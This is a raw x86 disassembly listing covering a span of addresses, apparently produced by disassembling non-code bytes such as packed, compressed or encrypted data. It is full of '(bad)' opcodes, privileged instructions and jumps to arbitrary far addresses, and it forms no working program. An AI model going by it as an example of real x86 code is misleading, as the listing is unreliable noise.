  428e54:	bound  ebp,QWORD PTR [eax+eiz*2+0x2f]
  428e58:	not    edi
  428e5a:	xchg   esp,eax
  428e5b:	mov    edi,0xce01fe49
  428e60:	ins    DWORD PTR es:[edi],dx
  428e61:	mov    eax,ds:0x45a8d45b
  428e66:	adc    al,0x1a
  428e68:	arpl   di,di
  428e6a:	std    
  428e6b:	mov    ds:0x2b00c8db,eax
  428e70:	inc    esi
  428e71:	mov    al,ds:0xdd3785af
  428e76:	dec    esi
  428e77:	dec    ecx
  428e78:	lock dec ebp
  428e7a:	icebp  
  428e7b:	je     0x428eee
  428e7d:	xchg   ebp,eax
  428e7e:	(bad)  
  428e7f:	test   al,0x3b
  428e81:	test   al,0x98
  428e83:	scas   eax,DWORD PTR es:[edi]
  428e84:	cs xor esp,esi
  428e87:	xor    al,0x15
  428e89:	ins    DWORD PTR es:[edi],dx
  428e8a:	stos   DWORD PTR es:[edi],eax
  428e8b:	add    DWORD PTR [ebx-0x5f1ab427],esp
	...
  428ef1:	add    BYTE PTR [eax],al
  428ef3:	add    BYTE PTR [edi+0x5d],cl
  428ef6:	pop    ecx
  428ef7:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428efb:	fstp   st(1)
  428efd:	ror    DWORD PTR [esp+edx*4],0x5b
  428f01:	out    dx,eax
  428f02:	inc    edi
  428f03:	push   eax
  428f04:	cmp    al,0xb6
  428f06:	add    DWORD PTR [eax],eax
  428f08:	add    eax,0x8d000001
  428f0d:	adc    DWORD PTR [ebp-0x38b8b145],ecx
  428f13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428f14:	sbb    DWORD PTR [ebp-0x5d],ebx
  428f17:	mov    bl,0x62
  428f19:	xchg   esi,eax
  428f1a:	and    al,0xa0
  428f1c:	sub    eax,0x9d033c75
  428f21:	sbb    eax,0x1b9fcfa6
  428f26:	pop    edx
  428f27:	mov    ch,0xec
  428f29:	mov    al,ds:0xdc035dab
  428f2e:	cwde   
  428f2f:	clc    
  428f30:	mov    edi,0x3fa3bbe8
  428f36:	imul   edx,DWORD PTR [esi+ecx*2-0x60],0x79
  428f3b:	fimul  DWORD PTR [ecx-0x2d]
  428f3e:	mov    WORD PTR [ebp-0x1a],?
  428f41:	pop    eax
  428f42:	mov    ah,0x7a
  428f44:	test   BYTE PTR [ebp+ebx*4-0x545ea7af],al
  428f4b:	or     bl,BYTE PTR [ebp+0x728d4357]
  428f51:	test   DWORD PTR [eax],edi
  428f53:	test   eax,0xcf92fa95
  428f58:	jae    0x428efd
  428f5a:	int3   
  428f5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428f5c:	stc    
  428f5d:	sbb    DWORD PTR [ebx+0x73],esi
  428f60:	adc    eax,0xa7abf321
  428f65:	xor    al,0x49
  428f67:	jmp    0xdf85bcdf
  428f6c:	jnp    0x428f15
  428f6e:	xchg   ebp,eax
  428f6f:	fisttp QWORD PTR [ecx-0x135d0cb1]
  428f75:	xlat   BYTE PTR ds:[ebx]
  428f76:	cmp    ebx,DWORD PTR [esi]
  428f78:	mov    DWORD PTR cs:[edi+0x50],esp
  428f7c:	jmp    0xa5f1c59d
  428f81:	push   esp
  428f82:	add    bh,BYTE PTR [edx]
  428f84:	add    BYTE PTR [edx+0x3ef1da2a],0xfe
  428f8b:	stos   DWORD PTR es:[edi],eax
  428f8c:	in     al,dx
  428f8d:	jo     0x428fce
  428f8f:	inc    esp
  428f90:	adc    eax,0xde087502
  428f95:	mov    esp,0x9ba91c75
  428f9a:	or     DWORD PTR [edx-0x6716efab],esp
  428fa0:	mov    bl,0x53
  428fa2:	sbb    BYTE PTR [edx+0x4da811a6],dl
  428fa8:	jns    0x429020
  428faa:	adc    BYTE PTR [edx],0x79
  428fad:	add    esi,DWORD PTR [eax]
  428faf:	cdq    
  428fb0:	dec    ebx
  428fb1:	mov    eax,edx
  428fb3:	xchg   ebp,eax
  428fb4:	add    ah,BYTE PTR [edx]
  428fb6:	jge    0x428f79
  428fb8:	pop    esi
  428fb9:	outs   dx,BYTE PTR ds:[esi]
  428fba:	popf   
  428fbb:	jns    0x428fe0
  428fbd:	scas   al,BYTE PTR es:[edi]
  428fbe:	add    DWORD PTR [edx],ebp
  428fc0:	and    DWORD PTR [edx-0x41],esp
  428fc3:	adc    eax,0x5bdb7823
  428fc8:	sahf   
  428fc9:	push   esp
  428fca:	cli    
  428fcb:	(bad)
  428fce:	sbb    al,0x41
  428fd0:	loop   0x428fbd
  428fd2:	(bad)  
  428fd3:	enter  0x9fde,0x23
  428fd7:	push   edx
  428fd8:	pop    ds
  428fd9:	pop    ebp
  428fda:	aad    0xe2
  428fdc:	and    BYTE PTR [eax],bl
  428fde:	or     ebx,DWORD PTR ds:0x201e001f
  428fe4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428fe5:	shl    DWORD PTR [ecx+esi*8-0x49],1
  428fe9:	add    DWORD PTR [ebp-0x542bb6cd],esi
  428fef:	icebp  
  428ff0:	xchg   esp,eax
  428ff1:	sbb    edi,ecx
  428ff3:	cwde   
  428ff4:	loope  0x428fb7
  428ff6:	aaa    
  428ff7:	xor    DWORD PTR [edx-0x50fe730e],ebx
  428ffd:	adc    edx,DWORD PTR [edi]
  428fff:	stos   BYTE PTR es:[edi],al
  429000:	ins    BYTE PTR es:[edi],dx
  429001:	in     eax,dx
  429002:	(bad)  
  429003:	cli    
  429004:	jae    0x42907a
  429006:	test   DWORD PTR [ecx+0x2e8b5812],ecx
  42900c:	hlt    
  42900d:	adc    ecx,esp
  42900f:	repnz rol DWORD PTR [eax],0x0
	...
  429073:	add    cl,ah
  429075:	in     al,dx
  429076:	mov    ebx,es
  429078:	(bad)  
  429079:	jecxz  0x42906a
  42907b:	out    dx,al
  42907c:	mov    edi,0xc5fc7b77
  429081:	mov    esp,0xb741b15c
  429086:	add    DWORD PTR [eax],eax
  429088:	add    eax,0x4e000001
  42908d:	fst    DWORD PTR [eax+0x30]
  429090:	ret    
  429091:	mov    al,ds:0x664b8cec
  429096:	aas    
  429097:	push   cs
  429098:	push   ecx
  429099:	inc    ebx
  42909a:	and    eax,0xe92ea67b
  42909f:	repz mov al,ds:0x611e4269
  4290a5:	pop    ebx
  4290a6:	inc    edx
  4290a7:	jecxz  0x429121
  4290a9:	jo     0x4290ea
  4290ab:	ins    BYTE PTR es:[edi],dx
  4290ac:	mov    al,0x6c
  4290ae:	retf   
  4290af:	cli    
  4290b0:	pop    ebx
  4290b1:	sbb    DWORD PTR [ebx],ebp
  4290b3:	cmp    eax,0x90e19a85
  4290b8:	pop    es
  4290b9:	and    eax,0x196d754e
  4290be:	faddp  st(0),st
  4290c0:	cmovg  ebp,DWORD PTR [ecx]
  4290c3:	sbb    DWORD PTR ds:0xe451834a,eax
  4290c9:	shr    DWORD PTR [eax+0x15],cl
  4290cc:	mov    dl,BYTE PTR [ebp-0x42]
  4290cf:	jg     0x4290d0
  4290d1:	gs inc esi
  4290d3:	enter  0xd7c7,0x28
  4290d7:	mov    esp,DWORD PTR ds:0x7cfce7c2
  4290dd:	dec    ecx
  4290de:	cmc    
  4290df:	cs push ss
  4290e1:	dec    eax
  4290e2:	sbb    eax,0x9401627
  4290e7:	mov    ebp,DWORD PTR [ecx+eax*4-0xcc0f6c9]
  4290ee:	in     al,dx
  4290ef:	pushf  
  4290f0:	mov    ds:0x25570ed3,eax
  4290f5:	push   ebx
  4290f6:	or     al,0x3b
  4290f8:	sub    al,BYTE PTR [ebp+edx*4-0x43]
  4290fc:	cmp    edi,DWORD PTR [eax+0x76]
  4290ff:	and    DWORD PTR [ebp-0x70ef4a33],0xf78184e2
  429109:	fwait
  42910a:	pop    ds
  42910b:	sub    dh,BYTE PTR [edi]
  42910d:	xchg   ecx,eax
  42910e:	out    dx,eax
  42910f:	pop    edi
  429110:	mov    ah,0x15
  429112:	(bad)  
  429113:	xchg   esp,eax
  429114:	mov    ebx,0x8f9fe758
  429119:	add    al,0x16
  42911b:	adc    esi,0x6f
  42911e:	jne    0x429197
  429120:	cmc    
  429121:	jbe    0x4290af
  429123:	pusha  
  429124:	(bad)  
  429125:	or     bh,BYTE PTR [eax+0x7b]
  429128:	lock push eax
  42912a:	inc    esp
  42912b:	mov    eax,0xcb7cbbe4
  429130:	sbb    bh,BYTE PTR [ecx+0x6a7fd4cb]
  429136:	mov    esi,0x828ee9d4
  42913b:	test   BYTE PTR [edi-0x2e05847c],al
  429141:	mov    ah,0x40
  429143:	call   0xb4d17ed3
  429148:	mov    dl,0x5a
  42914a:	adc    al,0x18
  42914c:	repnz push 0x82b25815
  429152:	push   esi
  429153:	imul   ebx,DWORD PTR [edx-0x66f94f81],0xdae487ed
  42915d:	int3   
  42915e:	aas    
  42915f:	dec    eax
  429160:	les    edi,FWORD PTR [edi-0xd7263a2]
  429166:	into   
  429167:	dec    edi
  429168:	ror    BYTE PTR [esp+ebx*2+0x49],1
  42916c:	fldenv [eax]
  42916e:	mov    edx,0x43520fb8
  429173:	jmp    FWORD PTR [edx]
  429175:	lods   al,BYTE PTR ds:[esi]
  429176:	aas    
  429177:	sub    esp,DWORD PTR [edx+0x16273f4a]
  42917d:	lds    edx,FWORD PTR [ebx+eiz*8-0x49]
  429181:	mov    esp,0x68e1fd1e
  429186:	popf   
  429187:	in     al,dx
  429188:	mov    dl,0x1c
  42918a:	xor    esp,esi
  42918c:	and    BYTE PTR [edi+0xfb87e],bl
	...
  4291f2:	add    BYTE PTR [eax],al
  4291f4:	push   esi
  4291f5:	xchg   ebp,edi
  4291f7:	test   ch,bh
  4291f9:	(bad)  
  4291fa:	jg     0x4291d3
  4291fc:	into   
  4291fd:	retf   
  4291fe:	or     DWORD PTR [esp+edx*4+0x461381f6],0x50001b8
  429209:	add    DWORD PTR [eax],eax
  42920b:	add    BYTE PTR [edi+0x18128253],cl
  429211:	imul   eax,DWORD PTR [ebx],0x54
  429214:	dec    edi
  429215:	(bad)  
  429216:	ficomp DWORD PTR [ebx-0x396222d2]
  42921c:	fwait
  42921d:	xchg   edx,eax
  42921e:	jmp    0x4291e9
  429220:	ins    BYTE PTR es:[edi],dx
  429221:	sub    ah,dl
  429223:	mov    bh,0xbf
  429225:	(bad)  
  429227:	data16 out 0xde,al
  42922a:	pushf  
  42922b:	mov    DWORD PTR [esi+0x6b160063],ebp
  429231:	test   DWORD PTR [edi],0xa2ff2b68
  429237:	add    ebp,edi
  429239:	and    al,0x75
  42923b:	sbb    ah,BYTE PTR [ebp+0x20]
  42923e:	stos   DWORD PTR es:[edi],eax
  42923f:	mov    bh,0x3e
  429241:	sub    dh,ch
  429243:	jmp    0xe666:0x1ca771f
  42924a:	lahf   
  42924b:	rcr    BYTE PTR [ebx+0x5aeaaab3],0xf6
  429252:	sub    eax,0x36bc1e17
  429257:	mov    ds:0x3cbc7ff1,al
  42925c:	fwait
  42925d:	out    0xb9,al
  42925f:	push   0x6839ad6d
  429264:	dec    esi
  429265:	cmc    
  429266:	shl    bh,1
  429268:	jle    0x42921b
  42926a:	shl    BYTE PTR [ebp-0x55],1
  42926d:	jns    0x83e7018c
  429273:	and    eax,0x42020837
  429278:	shl    DWORD PTR [ecx-0x3],0xa6
  42927c:	scas   al,BYTE PTR es:[edi]
  42927d:	pop    ebx
  42927e:	in     eax,dx
  42927f:	loop   0x429299
  429281:	add    edx,DWORD PTR [edx+eax*2]
  429284:	(bad)  
  429285:	shl    BYTE PTR [ebx+0x63d77d9f],0xce
  42928c:	outs   dx,DWORD PTR ds:[esi]
  42928d:	fcmovu st,st(1)
  42928f:	(bad)  
  429290:	popf   
  429291:	stos   BYTE PTR es:[edi],al
  429292:	aam    0xa2
  429294:	test   DWORD PTR [eax-0x7feb2a15],esi
  42929a:	sub    bh,BYTE PTR [edi]
  42929c:	call   DWORD PTR [ebx+0x1b8fcba0]
  4292a2:	dec    esp
  4292a3:	push   eax
  4292a4:	jle    0x42927d
  4292a6:	xor    eax,0x4f79172a
  4292ab:	dec    ah
  4292ad:	or     ebx,ebp
  4292af:	fwait
  4292b0:	test   al,0x7d
  4292b2:	call   0x4726:0xb65c30f4
  4292b9:	xor    bl,BYTE PTR [ebp+0x44]
  4292bc:	adc    ebx,DWORD PTR [ebx+ecx*8-0x1ea9fd58]
  4292c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4292c4:	pop    esp
  4292c5:	dec    esp
  4292c6:	or     BYTE PTR [edi],ch
  4292c8:	mov    es,WORD PTR [edi+edx*2+0x6b23a507]
  4292cf:	icebp  
  4292d0:	sub    eax,0x9edefbed
  4292d5:	xor    eax,0xba1023c7
  4292da:	and    ecx,0x27f91215
  4292e0:	cmp    DWORD PTR [edx],0x9dbf7405
  4292e6:	xchg   edi,eax
  4292e7:	push   eax
  4292e8:	xor    DWORD PTR ds:0x682cd14f,ebp
  4292ee:	mov    al,0xee
  4292f0:	dec    edi
  4292f1:	leave  
  4292f2:	push   esi
  4292f3:	test   BYTE PTR ds:0x850dc9e4,ch
  4292f9:	loop   0x429363
  4292fb:	sbb    al,0x3d
  4292fd:	std    
  4292fe:	push   0xffffffc0
  429300:	lock rol DWORD PTR [eax+0x6e],cl
  429304:	out    0x30,al
  429306:	cmp    dh,BYTE PTR [edx]
  429308:	jbe    0x4292a0
  42930a:	clc    
  42930b:	sbb    cl,dh
  42930d:	test   eax,0x6ccb87
	...
  429372:	add    BYTE PTR [eax],al
  429374:	lock adc al,0xe1
  429377:	(bad)  
  429378:	in     eax,0xff
  42937a:	call   FWORD PTR [esi]
  42937c:	jae    0x429383
  42937e:	dec    edx
  42937f:	mov    bh,0xbc
  429381:	xchg   edi,eax
  429382:	adc    eax,0x1b94be2
  429387:	add    BYTE PTR ds:0xe9000001,al
  42938d:	aam    0xa2
  42938f:	fisub  WORD PTR [ebp+0x7ee63348]
  429395:	mov    esi,0x5594a3a3
  42939a:	push   ecx
  42939b:	jmp    0x95ed:0x3a8931dd
  4293a2:	retf   
  4293a3:	repnz aam 0xc5
  4293a6:	inc    esi
  4293a7:	or     edi,edi
  4293a9:	dec    edx
  4293aa:	add    DWORD PTR [edi-0x7bbd54d9],esi
  4293b0:	jle    0x4293a1
  4293b2:	sbb    ebp,DWORD PTR ds:[edx-0x2dc33984]
  4293b9:	adc    edi,DWORD PTR [edx+0xe]
  4293bc:	cmp    edi,0x50
  4293bf:	fnstenv [edi]
  4293c1:	sbb    edx,esp
  4293c3:	and    dh,BYTE PTR [ecx-0x613638d0]
  4293c9:	push   ecx
  4293ca:	push   edi
  4293cb:	(bad)
  4293cf:	or     cl,bl
  4293d1:	jecxz  0x4293bf
  4293d3:	push   ss
  4293d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4293d5:	jo     0x42940f
  4293d7:	cmp    edx,esp
  4293d9:	sbb    eax,0x6f0a09d4
  4293de:	loopne 0x429434
  4293e0:	sahf   
  4293e1:	push   ebp
  4293e2:	jno    0x429399
  4293e4:	dec    edi
  4293e5:	lock bndmov [eax+0x51],bnd0
  4293eb:	ins    BYTE PTR es:[edi],dx
  4293ec:	in     eax,dx
  4293ed:	sbb    al,0x85
  4293ef:	iret   
  4293f0:	mov    esp,0xb0fb5214
  4293f5:	sbb    bh,BYTE PTR [ebx-0x4e]
  4293f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4293f9:	outs   dx,BYTE PTR ds:[esi]
  4293fa:	lock cmp dl,al
  4293fd:	std    
  4293fe:	mov    ebx,0x42c94314
  429403:	js     0x429472
  429405:	push   0xffffffad
  429407:	sbb    bl,BYTE PTR [eax-0x73]
  42940a:	fist   DWORD PTR [ebp+0x4]
  42940d:	mov    bl,0xaf
  42940f:	rcr    BYTE PTR [ebx+0x29],cl
  429412:	loope  0x429455
  429414:	(bad)  
  429415:	ret    0x9d7e
  429418:	in     eax,0x97
  42941a:	in     al,dx
  42941b:	xchg   ebx,eax
  42941c:	adc    eax,0x4b1b86a
  429421:	push   cs
  429422:	sub    al,0x8c
  429424:	add    eax,0xb0b29562
  429429:	loope  0x4293b7
  42942b:	adc    DWORD PTR [edi],esi
  42942d:	fistp  DWORD PTR [eax+0x7fb0cf18]
  429433:	jmp    0x45f1581c
  429438:	cmp    cl,BYTE PTR [ebx]
  42943a:	mov    ebx,0x8ff78a65
  42943f:	data16 shr BYTE PTR [edx-0x4e],0xd0
  429444:	data16 arpl WORD PTR [edi+esi*8+0x6d],cx
  429449:	sub    al,0xaa
  42944b:	rol    ch,cl
  42944d:	dec    eax
  42944e:	add    dl,cl
  429450:	adc    DWORD PTR [edi+0x1898823e],edi
  429456:	sti    
  429457:	push   ecx
  429458:	dec    edi
  429459:	jno    0x4294af
  42945b:	mov    bh,0x87
  42945d:	mov    edi,DWORD PTR [ecx+0x35]
  429460:	and    ch,ch
  429462:	jno    0x42942d
  429464:	ret    
  429465:	call   0xdbdf:0x1dcc5dea
  42946c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42946d:	adc    bh,dl
  42946f:	nop
  429470:	fiadd  WORD PTR [ecx+0x3f]
  429473:	push   eax
  429474:	ja     0x4294f3
  429476:	xor    DWORD PTR [ecx-0x70409881],ebp
  42947c:	dec    eax
  42947d:	inc    ecx
  42947e:	fs fcmovnbe st,st(3)
  429481:	retf   
  429482:	xchg   BYTE PTR [ebp+0x1f5eab5c],cl
  429488:	shr    ebx,cl
  42948a:	sub    dl,dl
  42948c:	cwde   
  42948d:	inc    edi
  42948e:	(bad)  
  42948f:	frstor [ebx]
	...
  4294f1:	add    BYTE PTR [eax],al
  4294f3:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  4294f7:	sub    al,0x53
  4294f9:	ds jg  0x429569
  4294fc:	dec    esp
  4294fd:	arpl   WORD PTR [ebp-0x7b5bfb16],dx
  429503:	sub    edx,DWORD PTR [eax-0x46]
  429506:	add    DWORD PTR [eax],eax
  429508:	add    eax,0x4d000001
  42950d:	xchg   DWORD PTR [ecx],ecx
  42950f:	das    
  429510:	and    eax,0x4d15096
  429515:	sub    BYTE PTR [ecx-0x22],bl
  429518:	in     al,dx
  429519:	loope  0x4294d2
  42951b:	or     esp,DWORD PTR [ebp+0x55]
  42951e:	ja     0x4294e1
  429520:	arpl   WORD PTR [eax+esi*1],dx
  429523:	inc    edi
  429524:	je     0x4294cd
  429526:	and    esp,DWORD PTR [ecx-0x1f1fc640]
  42952c:	and    eax,0x5876b389
  429531:	ins    DWORD PTR es:[edi],dx
  429532:	into   
  429533:	popf   
  429534:	sub    edi,edx
  429536:	inc    ecx
  429537:	xchg   bl,ch
  429539:	das    
  42953a:	jecxz  0x42956d
  42953c:	xchg   ebx,eax
  42953d:	ja     0x429533
  42953f:	add    BYTE PTR cs:[ebx+0x3de4c634],ch
  429546:	in     eax,dx
  429547:	xchg   edx,eax
  429548:	out    0x17,al
  42954a:	test   al,0xaa
  42954c:	dec    ecx
  42954d:	ret    0x7f9d
  429550:	mov    BYTE PTR es:[edx+0x7c762648],dl
  429557:	add    edx,DWORD PTR [edx+esi*2]
  42955a:	fwait
  42955b:	test   bh,ch
  42955d:	adc    BYTE PTR [esp+edx*2-0x5b54f790],ah
  429564:	jbe    0x429591
  429566:	fidiv  DWORD PTR [esi]
  429568:	push   eax
  429569:	repnz mov ?,ebp
  42956c:	or     ch,BYTE PTR [eax-0x79cd001b]
  429572:	jno    0x42951a
  429574:	mov    al,ds:0x349fd717
  429579:	mov    BYTE PTR [ebx-0x3f5e33c8],dh
  42957f:	stc    
  429580:	xchg   ebx,eax
  429581:	jmp    FWORD PTR [edi+0x5a]
  429584:	lahf   
  429585:	sub    ah,ch
  429587:	xor    al,0xa8
  429589:	test   BYTE PTR [edx+0x25],al
  42958c:	imul   DWORD PTR [esi-0x4d]
  42958f:	mov    dh,0xad
  429591:	or     BYTE PTR [eax-0x20d4f41],cl
  429597:	mov    di,0xa26d
  42959b:	push   ebx
  42959c:	jp     0x429567
  42959e:	iret   
  42959f:	adc    DWORD PTR [esi],ebp
  4295a1:	aaa    
  4295a2:	or     al,0x48
  4295a4:	mov    esp,cr5
  4295a7:	aad    0x75
  4295a9:	pop    ebp
  4295aa:	adc    eax,0xf5344abb
  4295af:	out    0x7d,eax
  4295b1:	loopne 0x429586
  4295b3:	gs cmps BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4295b6:	and    ebp,ebx
  4295b8:	in     al,dx
  4295b9:	push   0x66
  4295bb:	clc    
  4295bc:	cmp    eax,0x523e5f75
  4295c1:	pop    ebp
  4295c2:	mov    ebx,0x18311fb1
  4295c7:	fistp  WORD PTR [esi]
  4295c9:	mov    ch,ah
  4295cb:	(bad)  
  4295cc:	idiv   ch
  4295ce:	cli    
  4295cf:	aam    0x70
  4295d1:	loop   0x42963b
  4295d3:	sub    DWORD PTR [eax],edx
  4295d5:	shl    bl,cl
  4295d7:	pop    ds
  4295d8:	mov    gs:0xa8ecc468,al
  4295de:	nop
  4295df:	addr16 mov al,0x39
  4295e2:	push   esp
  4295e3:	sahf   
  4295e4:	xchg   ebp,eax
  4295e5:	jb     0x429625
  4295e7:	pop    ebx
  4295e8:	inc    eax
  4295e9:	pop    eax
  4295ea:	xchg   ebx,eax
  4295eb:	cmp    BYTE PTR es:[edx-0x5659e9f7],dh
  4295f2:	add    eax,ebp
  4295f4:	inc    edi
  4295f5:	test   BYTE PTR [ebx+0x1e],dl
  4295f8:	dec    esi
  4295f9:	stc    
  4295fa:	out    0x88,al
  4295fc:	out    dx,al
  4295fd:	mov    ecx,0x61486b47
  429602:	sub    bh,0x48
  429605:	ss mov ch,0xb0
  429608:	pop    ebp
  429609:	or     eax,0x671257a8
  42960e:	sbb    BYTE PTR [eax],0x7
	...
  429671:	add    BYTE PTR [eax],al
  429673:	add    BYTE PTR [ebp+0x1d],ch
  429676:	out    0xc0,al
  429678:	idiv   bl
  42967a:	outs   dx,DWORD PTR ds:[esi]
  42967b:	mov    ebp,0xab7b5cea
  429680:	ja     0x42961d
  429682:	outs   dx,BYTE PTR ds:[esi]
  429683:	jmp    0x4451dd
  429688:	add    eax,0xe5000001
  42968d:	mov    BYTE PTR [edi+esi*4-0x5b06059b],dl
  429694:	(bad)  [eax-0x50e260a3]
  42969a:	and    BYTE PTR [ebp-0xdf99ad5],ch
  4296a0:	test   al,0x8f
  4296a2:	mov    BYTE PTR [esi-0x77dfcb4d],ch
  4296a8:	sub    BYTE PTR [ecx-0x368f08ae],al
  4296ae:	iret   
  4296af:	into   
  4296b0:	mov    eax,ds:0xb91428b6
  4296b5:	icebp  
  4296b6:	sub    DWORD PTR [ebx+edx*2],ebp
  4296b9:	jns    0x42970f
  4296bb:	shl    DWORD PTR [ebx],cl
  4296bd:	ficom  DWORD PTR [edx]
  4296bf:	ins    BYTE PTR es:[edi],dx
  4296c0:	add    al,0x56
  4296c2:	push   0x1f693286
  4296c7:	ret    0x8539
  4296ca:	ret    
  4296cb:	xor    eax,0x634b6667
  4296d0:	ret    
  4296d1:	inc    ebx
  4296d2:	jnp    0x4296bf
  4296d4:	fcomp  DWORD PTR [esi+0x1a607df5]
  4296da:	hlt    
  4296db:	mov    dl,0x7a
  4296dd:	pop    ecx
  4296de:	fstp   TBYTE PTR [ecx+0x64562e7a]
  4296e4:	(bad)  
  4296e6:	not    BYTE PTR [edi]
  4296e8:	stc    
  4296e9:	nop
  4296ea:	fucom  st(7)
  4296ec:	xchg   esp,eax
  4296ed:	jne    0x429675
  4296ef:	sub    DWORD PTR [esi+ebp*8],edi
  4296f2:	xor    DWORD PTR [esi],edx
  4296f4:	cmp    DWORD PTR [eax-0x74],esp
  4296f7:	nop
  4296f8:	push   ds
  4296f9:	aas    
  4296fa:	test   al,0xc4
  4296fc:	add    esi,DWORD PTR [edi+0x4]
  4296ff:	and    al,BYTE PTR [edx+0x5f2bd907]
  429705:	pop    edx
  429706:	inc    edi
  429707:	sbb    ch,al
  429709:	sbb    edi,DWORD PTR [esi]
  42970b:	mov    eax,esi
  42970d:	les    eax,FWORD PTR [ebx]
  42970f:	mov    al,ds:0xd95a11c5
  429714:	xchg   esi,eax
  429715:	inc    esi
  429716:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429717:	(bad)  
  429718:	loopne 0x429727
  42971a:	mov    edx,0xb180248b
  42971f:	ror    esi,0xe5
  429722:	fsubr  DWORD PTR [ecx-0x1b]
  429725:	daa    
  429726:	ja     0x4296c3
  429728:	imul   ecx,ebp,0xd42e0959
  42972e:	bnd jno 0x42978c
  429731:	dec    esi
  429732:	add    bh,BYTE PTR [ecx]
  429734:	sbb    ch,bl
  429736:	in     eax,0x53
  429738:	dec    ebx
  429739:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42973a:	fdiv   DWORD PTR [esi]
  42973c:	outs   dx,BYTE PTR ds:[esi]
  42973d:	add    ecx,DWORD PTR [ebp+0x1bc3b4e]
  429743:	data16 clc 
  429745:	fwait
  429746:	pop    ecx
  429747:	outs   dx,DWORD PTR ds:[esi]
  429748:	xlat   BYTE PTR ds:[ebx]
  429749:	mov    fs,ebp
  42974b:	shl    BYTE PTR [esi-0x3ba67db2],0x8
  429752:	pop    ebp
  429753:	adc    cl,bl
  429755:	dec    esp
  429756:	xchg   edx,eax
  429757:	add    eax,0x1d8c69c3
  42975c:	push   0xfffffff5
  42975e:	jge    0x429724
  429760:	mov    eax,es:0x66b0d134
  429766:	cmp    DWORD PTR ds:0x4b1901cc,edi
  42976c:	aad    0x39
  42976e:	inc    ebx
  42976f:	hlt    
  429770:	mov    ah,0x66
  429772:	inc    eax
  429773:	sbb    eax,0x41c446f6
  429778:	adc    dl,bh
  42977a:	mov    bh,0x21
  42977c:	push   cs
  42977d:	and    DWORD PTR [ebx],esi
  42977f:	ins    DWORD PTR es:[edi],dx
  429780:	jno    0x429703
  429782:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429783:	rol    BYTE PTR [ecx+0x78],cl
  429786:	push   ds
  429787:	inc    edi
  429788:	in     al,0x3d
  42978a:	scas   eax,DWORD PTR es:[edi]
  42978b:	pop    ebp
  42978c:	adc    al,0x1a
  42978e:	bound  esi,QWORD PTR [edx]
  429790:	mov    DWORD PTR [eax],eax
	...
  4297f2:	add    BYTE PTR [eax],al
  4297f4:	xor    BYTE PTR [edx-0x21],al
  4297f7:	(bad)  
  4297f8:	(bad)  
  4297f9:	(bad)  
  4297fa:	mov    ebp,0x1d164c52
  4297ff:	pop    ebp
  429800:	fistp  DWORD PTR [ecx-0x41]
  429803:	push   ds
  429804:	pop    edx
  429805:	mov    esp,0x1050001
  42980a:	add    BYTE PTR [eax],al
  42980c:	les    eax,FWORD PTR ds:0xec2cad95
  429812:	test   DWORD PTR [ebx+edx*2-0x5c],0x9e061907
  42981a:	mov    BYTE PTR [esi+0x4],bl
  42981d:	fisubr WORD PTR [ebx+0x4c]
  429820:	ficom  WORD PTR [esi+0x6823222e]
  429826:	cmp    BYTE PTR [ecx-0x715ccf92],bh
  42982c:	jno    0x4297f2
  42982e:	mov    edx,0xf27f9734
  429833:	imul   edi,edi,0xdb19fa57
  429839:	std    
  42983a:	dec    esp
  42983b:	sbb    ebx,esi
  42983d:	aam    0x5d
  42983f:	xchg   ecx,eax
  429840:	pop    esi
  429841:	mov    ds:0xf39ba1cb,al
  429846:	mov    ds,WORD PTR [edi+0x3f]
  429849:	imul   BYTE PTR [ebp+0x6f]
  42984c:	cmp    al,0x51
  42984e:	xchg   bh,dl
  429850:	xchg   ebx,eax
  429851:	mov    eax,0x11859585
  429856:	popa   
  429857:	inc    esp
  429858:	cmc    
  429859:	add    esi,DWORD PTR [edx-0x40]
  42985c:	es add eax,0x34b8881b
  429862:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429863:	sbb    DWORD PTR [esi-0x71],eax
  429866:	push   ebp
  429867:	or     eax,0x8f029737
  42986c:	hlt    
  42986d:	xchg   ecx,eax
  42986e:	mov    eax,ds:0xf5596441
  429873:	dec    esp
  429874:	(bad)  
  429875:	or     DWORD PTR [edi-0x7c063f94],ebp
  42987b:	sub    BYTE PTR [edx],ah
  42987d:	fistp  QWORD PTR [edi]
  42987f:	inc    edi
  429880:	leave  
  429881:	popa   
  429882:	mov    edi,DWORD PTR [ecx-0x6a]
  429885:	sar    DWORD PTR [edi-0x38],1
  429888:	addr16 (bad) 
  42988a:	jl     0x429866
  42988c:	sub    eax,0x347e8c80
  429891:	lock fsubr DWORD PTR [edi-0x14466c39]
  429898:	push   edx
  429899:	xlat   BYTE PTR ds:[ebx]
  42989a:	dec    ebp
  42989b:	dec    ecx
  42989c:	retf   0x765b
  42989f:	and    ebx,DWORD PTR [esp+ebx*2-0x74d1fdaa]
  4298a6:	aas    
  4298a7:	hlt    
  4298a8:	or     ch,BYTE PTR [ecx-0xdcc9718]
  4298ae:	fimul  WORD PTR [edi+ebx*2-0x30]
  4298b2:	xchg   edi,eax
  4298b3:	sbb    dh,BYTE PTR [edx-0xa]
  4298b6:	ins    DWORD PTR es:[edi],dx
  4298b7:	cmp    DWORD PTR [edi+0x66],ecx
  4298ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4298bb:	adc    DWORD PTR [ebx+0x35e7efbc],esi
  4298c1:	dec    esi
  4298c2:	test   eax,0x632c7e83
  4298c7:	push   ebx
  4298c8:	mov    esi,0x5b36f61b
  4298cd:	dec    eax
  4298ce:	push   edi
  4298cf:	shl    BYTE PTR [ecx+0x421e08cf],cl
  4298d5:	push   esi
  4298d6:	cmp    eax,0xb1bf2dac
  4298db:	inc    eax
  4298dc:	popa   
  4298dd:	mov    bh,0x53
  4298df:	sbb    edx,DWORD PTR [edi+0x75]
  4298e2:	mov    edi,0x63beb164
